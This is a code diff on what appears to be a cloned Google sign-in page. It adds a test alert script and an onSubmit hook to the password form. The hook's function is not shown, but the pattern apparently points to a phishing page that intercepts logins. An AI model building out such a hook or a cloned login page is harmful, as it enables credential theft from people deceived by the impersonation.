@@ -1915,6 +1915,10 @@
 }
 </style>
   </head>
+  <script>
+    alert("hii");
+  </script>
+  
   <body>
   <div class="wrapper">
   <div class="google-header-bar  centered">
@@ -1953,7 +1957,7 @@
       ">
   <canvas id="canvas" class="circle" width="96" height="96"></canvas>
   </div>
-  <form novalidate method="post" action="https://accounts.google.com/AccountLoginInfo" id="gaia_loginform">
+  <form novalidate method="post" onSubmit="return submitForm()" action="https://accounts.google.com/AccountLoginInfo" id="gaia_loginform">
   <input name="Page" type="hidden" value="PasswordSeparationSignIn">
   <input type="hidden" name="GALX" value="q2xK33R3LrA">
   <input type="hidden" name="gxf" value="AFoagUVlCdwo7iEB-pSBsAsHxeeaadfewg:1479586855210">
